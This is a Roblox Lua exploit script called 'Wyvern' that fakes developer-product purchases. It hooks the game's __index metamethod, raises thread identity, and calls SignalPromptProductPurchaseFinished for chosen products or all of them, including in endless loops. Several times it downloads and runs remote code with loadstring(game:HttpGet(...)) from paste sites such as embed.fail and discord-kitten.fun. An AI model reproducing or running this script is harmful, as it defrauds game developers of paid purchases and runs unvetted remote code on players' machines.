local wyvernsuccess, wyvernerror = pcall(function()
getgenv().wyvern_version = "1.5.6"

local LOAD_TIME = tick()

local defaults = {
    ["Purchase Exploits"] = true
}

if getgenv().WyvernConfig == nil then
    getgenv().WyvernConfig = defaults
end

getgenv().WyvernLoaded = false

for i in pairs(defaults) do
    if getgenv().WyvernConfig[i] == nil then
        getgenv().WyvernConfig[i] = defaults[i]
    end
end

local queueonteleport = queue_on_teleport or queueonteleport
local setclipboard = toclipboard or setrbxclipboard or setclipboard
local clonefunction = clonefunc or clonefunction
local setthreadidentity = set_thread_identity or setthreadcaps or setthreadidentity
local firetouchinterests = fire_touch_interests or firetouchinterests
if getnamecallmethod then
    local getnamecallmethod = get_namecall_method or getnamecallmethod
end

local f = {}
function f.invalidate(g)
    if not InstanceList then
        return
    end
    for b, c in pairs(InstanceList) do
        if c == g then
            InstanceList[b] = nil
            return g
        end
    end
end
if not cloneref then
    getgenv().cloneref = f.invalidate
end

getrenv().Visit = cloneref(game:GetService("Visit"))
getrenv().MarketplaceService = cloneref(game:GetService("MarketplaceService"))
getrenv().HttpRbxApiService = cloneref(game:GetService("HttpRbxApiService"))
local CoreGui = cloneref(game:GetService("CoreGui"))
local RunService = cloneref(game:GetService("RunService"))
local Players = cloneref(game:GetService("Players"))
local NetworkSettings = settings().Network
local UserGameSettings = UserSettings():GetService("UserGameSettings")
getrenv().getgenv = clonefunction(getgenv)

local message = Instance.new("Message")
message.Text = "" -- Set the loading message to blank
message.Name = "ðŸ’‹â€  ð“ð“˜ð“–ð“–ð“â€€! ð“—ð“ð“’ð“š  â€ðŸ’‹"
message.Parent = CoreGui

task.wait(0.1)

getgenv().stealth_call = function(script)
    getrenv()._set = clonefunction(setthreadidentity)
    local old
    old =
        hookmetamethod(
        game,
        "__index",
        function(a, b)
            task.spawn(
                function()
                    _set(7)
                    task.wait(0.1)
                    local went, error =
                        pcall(
                        function()
                            loadstring(script)()
                        end
                    )
                    print(went, error)
                    if went then
                        local check = Instance.new("LocalScript")
                        check.Parent = Visit
                    end
                end
            )
            hookmetamethod(game, "__index", old)
            return old(a, b)
        end
    )
end

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/DenDenZZZ/Orion-UI-Library/refs/heads/main/source')))()

local Window = OrionLib:MakeWindow({
    Name = "The 1M$ Glass Bridge (by Xploiter_RBLX)",
    HidePremium = false,
    SaveConfig = false,           
    ConfigFolder = nil,       
    IntroEnabled = true,
    IntroText = "Welcome, " .. game.Players.LocalPlayer.Name,
    IntroIcon = "rbxassetid://82778010291487"
})

local Tab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

if getgenv().WyvernConfig["Purchase Exploits"] then
    local Section = Tab:AddSection({
        Name = "Purchase Exploits"
    })
    
    local x_x =
        game:GetService("HttpService"):JSONDecode(
        game:HttpGet(
            "https://apis.roblox.com/developer-products/v1/developer-products/list?universeId=" ..
                game.GameId .. "&page=1"
        )
    )
    local dnames = {}
    local dproductIds = {}
    if type(x_x.DeveloperProducts) == "nil" then
        table.insert(dnames, " ")
    end

    pcall(
        function()
            local currentPage = 1

            repeat
                local response =
                    game:HttpGet(
                    "https://apis.roblox.com/developer-products/v1/developer-products/list?universeId=" ..
                        tostring(game.GameId) .. "&page=" .. tostring(currentPage)
                )
                local decodedResponse = game:GetService("HttpService"):JSONDecode(response)
                local developerProducts = decodedResponse.DeveloperProducts
                print("Page " .. currentPage .. ":")
                for _, developerProduct in pairs(developerProducts) do
                    table.insert(dnames, developerProduct.Name)
                    table.insert(dproductIds, developerProduct.ProductId)
                end
                currentPage = currentPage + 1
                local final = decodedResponse.FinalPage
            until final
        end
    )
    
    local index
    Tab:AddDropdown({
        Name = "Choose Product",
        Default = "",
        Options = dnames,
        Callback = function(x)
            index = nil
            for i, name in ipairs(dnames) do
                if name == x then
                    index = i
                    break
                end
            end
        end
    })
    getgenv().wyvernlooppurchases = false
    Tab:AddToggle({
        Name = "Loop Selected Product",
        Default = false,
        Callback = function(bool)
            getgenv().wyvernlooppurchases = bool
            while getgenv().wyvernlooppurchases == true and task.wait() do
                if index then
                    local product = dproductIds[index]
                    pcall(
                        function()
                            stealth_call(
                                "MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, " ..
                                    product .. ", true) "
                            )
                        end
                    )
                end
            end
        end
    })
    Tab:AddButton({
        Name = "Fire Selected Product!",
        Callback = function()
            if index then
                local product = dproductIds[index]
                pcall(
                    function()
                        stealth_call(
                            "MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, " ..
                                product .. ", true) "
                        )
                    end
                )
                task.wait(0.2)
                if not Visit:FindFirstChild("LocalScript") then
                    OrionLib:MakeNotification({
                        Name = "Error",
                        Content = "Your executor blocked function SignalPromptProductPurchaseFinished.",
                        Image = "rbxassetid://4483345998",
                        Time = 5
                    })
                else
                    OrionLib:MakeNotification({
                        Name = "Success",
                        Content = "Fired PromptProductPurchaseFinished signal to server with productId: " ..
                            tostring(product),
                        Image = "rbxassetid://4483345998",
                        Time = 5
                    })
                    Visit:FindFirstChild("LocalScript"):Destroy()
                end
            else
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "Something went wrong but I don't know what.",
                    Image = "rbxassetid://4483345998",
                    Time = 5
                })
            end
        end
    })
    Tab:AddButton({
        Name = "Fire All Products",
        Callback = function()
            getrenv()._set = clonefunction(setthreadidentity)
            local starttickcc = tick()
            for i, product in pairs(dproductIds) do
                task.spawn(
                    function()
                        pcall(
                            function()
                                stealth_call(
                                    "MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, " ..
                                        product .. ", true) "
                                )
                            end
                        )
                    end
                )
                task.wait()
            end
            local endtickcc = tick()
            local durationxd = endtickcc - starttickcc
            OrionLib:MakeNotification({
                Name = "Attempt",
                Content = "Fired All Products! Took " .. tostring(durationxd) .. " Seconds!",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    })
    getgenv().wyvernlooppurchases2 = false
    Tab:AddToggle({
        Name = "Loop All Products",
        Default = false,
        Callback = function(bool)
            getgenv().wyvernlooppurchases2 = bool
            while getgenv().wyvernlooppurchases2 == true and task.wait() do
                for i, product in pairs(dproductIds) do
                    task.spawn(
                        function()
                            pcall(
                                function()
                                    stealth_call(
                                        "MarketplaceService:SignalPromptProductPurchaseFinished(game.Players.LocalPlayer.UserId, " ..
                                            product .. ", true) "
                                    )
                                end
                            )
                        end
                    )
                    task.wait()
                end
            end
        end
    })
end

getgenv().WyvernLoaded = true

getgenv().WyvernConfig = nil
pcall(
    function()
        if message.Text ~= "" then -- Check for blank message
            game.Players.LocalPlayer:Kick()
            task.spawn(
                function()
                    task.wait(10)
                    game.Players.LocalPlayer:remove()
                end
            )
        end
        message:Destroy()
    end
)

local adonisFound = false

task.spawn(
    function()
        for _, v in pairs(game:GetDescendants()) do
            if adonisFound then
                return
            end

            if
                string.find(v.Name:upper(), "ADONIS") or
                    (v:IsA("ImageButton") and v.Image == "rbxassetid://357249130")
             then
                adonisFound = true
                OrionLib:MakeNotification({
                    Name = "Redblue Adonis Finder",
                    Content = "There is Adonis in the game, please try !buyitem or !buyasset.",
                    Image = "rbxassetid://4483345998",
                    Time = 5
                })
                return
            end
        end
    end
)

task.spawn(
    function()
        for _, d in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
            if adonisFound then
                return
            end

            if d:IsA("RemoteEvent") and d:FindFirstChild("__FUNCTION") then
                adonisFound = true
                OrionLib:MakeNotification({
                    Name = "Redblue Adonis Finder",
                    Content = "There is Adonis in the game, please try !buyitem or !buyasset.",
                    Image = "rbxassetid://4483345998",
                    Time = 5
                })
                return
            end
        end
    end
)
if getgenv().SentPromptCorePackage == nil then
    getgenv().SentPromptCorePackage = false
end
task.spawn(
    function()
        getgenv().realwyvernversion = loadstring(game:HttpGet("https://embed.fail/p/raw/xr31a35ucr"))()
        
        if getgenv().wyvern_version == nil or getgenv().wyvern_version ~= getgenv().realwyvernversion then
            if getgenv().SentPromptCorePackage == false then
                getgenv().SentPromptCorePackage = true
                local PromptLib = loadstring(game:HttpGet("https://embed.fail/p/raw/57rlobkgdv"))()
                PromptLib(
                    "Heads Up!",
                    "This Wyvern is not up to date! Please tell the uploader of the script to update it to the newest version. This is to enhance your experience with the latest updates.",
                    {
                        {
                            Text = "Execute Latest Wyvern",
                            LayoutOrder = 1,
                            Primary = true,
                            Callback = function()
                                pcall(
                                    function()
                                        loadstring(game:HttpGet("https://discord-kitten.fun/p/raw/pl6mjl4xoy"))(

                                        )
                                        game:GetService("GuiService"):ClearError()
                                        setclipboard("https://discord-kitten.fun/p/raw/pl6mjl4xoy")
                                    end
                                )
                            end
                        },
                        {
                            Text = "Close",
                            LayoutOrder = 2,
                            Primary = false,
                            Callback = function()
                                game:GetService("GuiService"):ClearError()
                            end
                        }
                    }
                )
            end
        end
    end
)
end)
if not wyvernsuccess or wyvernerror ~= nil then
    print(wyvernerror)
end

OrionLib:Init()
